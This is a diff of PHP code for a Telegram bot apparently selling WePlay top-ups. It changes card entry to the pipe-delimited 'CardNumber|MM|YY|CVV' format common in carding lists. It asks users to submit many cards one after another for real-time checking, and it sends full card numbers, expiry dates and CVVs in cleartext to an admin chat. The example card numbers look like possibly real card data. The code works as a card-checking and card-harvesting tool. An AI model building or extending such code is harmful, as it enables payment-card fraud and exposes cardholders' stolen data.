@@ -439,25 +439,24 @@ function wpbHandleText($cfg, $msg) {
     }
 
     if ($s === 'await_card_details') {
-        // Expected format: XXXXXXXXXXXX/MMYY/CCC
+        // Expected format: CardNumber|MM|YY|CVV  e.g. 5344132712656151|11|26|340
         $raw = preg_replace('/\s+/', '', $text);
-        if (!preg_match('/^(\d{13,19})\/(\d{4})\/(\d{3,4})$/', $raw, $cm)) {
+        if (!preg_match('/^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$/', $raw, $cm)) {
             tgSend($token, $chatId,
                 "❌ <b>Invalid format.</b>\n\n"
                 . "Please send card details exactly like this:\n\n"
-                . "<code>XXXXXXXXXXXX/MMYY/CCC</code>\n\n"
-                . "<b>Example:</b>\n<code>4111111111111111/1226/123</code>\n\n"
-                . "<b>Card Number / Expiry (MMYY) / CVV</b>\n\n"
+                . "<code>CardNumber|MM|YYYY|CVV</code>\n\n"
+                . "<b>Example:</b>\n<code>5430139926528329|06|2028|082</code>\n\n"
+                . "<b>Card Number | Month | Year | CVV</b>\n\n"
                 . "Send the next card or /cancel to stop."
             );
             return;
         }
 
         $cardNumber  = $cm[1];
-        $expiry      = $cm[2]; // MMYY
-        $cvv         = $cm[3];
-        $mm          = substr($expiry, 0, 2);
-        $yy          = substr($expiry, 2, 2);
+        $mm          = str_pad($cm[2], 2, '0', STR_PAD_LEFT);
+        $yy          = $cm[3]; // stored as-is (supports YY or YYYY)
+        $cvv         = $cm[4];
         $pkg         = $data['pkg'] ?? [];
         $weplayId    = $data['weplay_id'] ?? '';
         $maskedCard  = str_repeat('*', strlen($cardNumber) - 4) . substr($cardNumber, -4);
@@ -535,10 +534,17 @@ function wpbNotifyAdmin($cfg, $txnId) {
     $cardFull   = $p['card_number'] ?? '';
     $cardExpiry = $p['card_expiry'] ?? '';
     $cardCvv    = $p['card_cvv'] ?? '';
+    // Rebuild pipe format for admin: CardNumber|MM|YYYY|CVV
+    $cardPipeFmt = '';
+    if ($cardFull && $cardExpiry && $cardCvv) {
+        // card_expiry stored as MM/YY or MM/YYYY
+        [$fmtMm, $fmtYy] = array_pad(explode('/', $cardExpiry), 2, '');
+        $cardPipeFmt = "{$cardFull}|{$fmtMm}|{$fmtYy}|{$cardCvv}";
+    }
     $cardLine   = $cardFull
         ? "<b>💳 Card:</b> <code>{$cardFull}</code>\n"
           . "<b>📅 Expiry:</b> <code>{$cardExpiry}</code> | <b>CVV:</b> <code>{$cardCvv}</code>\n"
-          . "<b>Format:</b> <code>{$cardFull}/{$cardExpiry}/{$cardCvv}</code>\n"
+          . ($cardPipeFmt ? "<b>Format:</b> <code>{$cardPipeFmt}</code>\n" : '')
         : (!empty($p['card_last4'])
             ? "<b>Card:</b> <code>****" . htmlspecialchars($p['card_last4'], ENT_NOQUOTES, 'UTF-8') . "</code>"
               . ($cardExpiry ? " | Expiry: <code>{$cardExpiry}</code>" : '') . "\n"
@@ -623,9 +629,9 @@ function wpbHandleCallback($cfg, $cb) {
                 . "💵 <b>Amount:</b> ₹" . number_format((float)$pkg['price'], 2) . "\n"
                 . ($weplayId ? "<b>WePlay ID:</b> <code>" . htmlspecialchars($weplayId, ENT_NOQUOTES, 'UTF-8') . "</code>\n" : '')
                 . "\n<b>Send your card details in this format:</b>\n\n"
-                . "<code>XXXXXXXXXXXX/MMYY/CCC</code>\n\n"
-                . "<b>Example:</b>\n<code>4111111111111111/1226/123</code>\n\n"
-                . "📌 <b>Card Number / Expiry (MMYY) / CVV</b>\n\n"
+                . "<code>CardNumber|MM|YYYY|CVV</code>\n\n"
+                . "<b>Example:</b>\n<code>5430139926528329|06|2028|082</code>\n\n"
+                . "📌 <b>Card Number | Month | Year | CVV</b>\n\n"
                 . "🔄 <b>You can send multiple cards one by one. Each card will be checked and you will get real-time status. Send /cancel to stop.</b>";
             tgSend($token, $chatId, $msg);
             return;
@@ -714,7 +720,7 @@ function wpbHandleCallback($cfg, $cb) {
             . "💵 <b>Amount:</b> ₹" . number_format((float)$p['amount'], 2) . "\n\n"
             . "⚠️ <b>This card could not be charged.</b>\n\n"
             . "📤 <b>Send another card in the same format to try again:</b>\n"
-            . "<code>XXXXXXXXXXXX/MMYY/CCC</code>\n\n"
+            . "<code>CardNumber|MM|YYYY|CVV</code>\n\n"
             . "Or send /cancel to stop.";
 
         tgSend($token, $p['chat_id'], $declineMsg);
